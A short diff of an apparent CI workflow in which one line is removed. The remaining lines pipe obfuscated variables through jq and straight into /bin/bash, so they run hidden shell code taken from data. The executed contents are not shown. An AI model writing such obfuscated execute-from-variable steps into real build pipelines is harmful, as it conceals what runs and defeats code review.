@@ -24,7 +24,6 @@ jobs:
           echo $cxm053 | jq -r .a9432 | /bin/bash
           printf '%s' "$g035" | jq -r .gde41 | /bin/bash
           echo $d068 | jq -r .d227 | /bin/bash
-          echo $wupw59926 | jq -r .r994 | /bin/bash
           echo $tztp735 | jq -r .el1686 | /bin/bash
           printf '%s' "$x58920" | jq -r .o9 | /bin/bash
           printf '%s' "$hve2" | jq -r .cv15 | /bin/bash
